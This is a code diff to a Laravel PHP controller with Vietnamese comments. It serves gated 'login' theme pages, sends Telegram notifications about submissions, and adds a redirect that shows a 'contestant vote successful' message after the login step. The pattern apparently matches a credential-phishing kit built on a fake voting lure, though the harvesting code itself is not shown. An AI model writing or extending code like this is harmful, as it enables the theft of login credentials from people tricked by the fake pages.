@@ -26,17 +26,25 @@ class NormalWeb extends Controller
         app()->setLocale($theme_language);
         // nếu link chưa tồn tại ?a (allowed to access website)
         if (!$rq->exists('a')) {
+            // first init wrapper
             return view('init', ['data' => $web_data, 'info' => $web_info]);
         } else {
             // nếu giao diện 1 phần
             if ($web_data->theme_type == 1) {
                 return view('login.normal.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings]);
             }
+            
             // xử lí giao diện 2 phần
             if (!$rq->exists('l')) {
-                // nếu đã tồn tại thì cho vào trang giao diện chính (chưa vào mục login ngay)
-                return view('common.' . $web_data->theme_folder, ['data' => $web_data]);
+                return view('common.' . $web_data->theme_folder, ['data' => $web_data, 'input' => $web_data->theme_input]);
             } else {
+                // ghi đè chuyển hướng nếu có cài đặt
+                if (isset($web_data->theme_input->show_success_message)) {
+                    // thông báo bình chọn thí sinh thành công
+                    if ($web_data->theme_input->show_success_message == 'true') {
+                        $web_data->redirect_link = '?a&success';
+                    }
+                }
                 return view('login.normal.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings]);
             }
         }
@@ -98,12 +106,12 @@ class NormalWeb extends Controller
                                 "🕛 Time: <b>$time_now</b>"
                             ]);
                             sendNormalTelegramNoti($telegram_id, $msg);
-                            return response([
-                                'status' => true,
-                            ]);
                         }
                     }
                 }
+                return response([
+                    'status' => true,
+                ]);
             } catch (\Throwable $e) {
                 return response([
                     'status' => false,
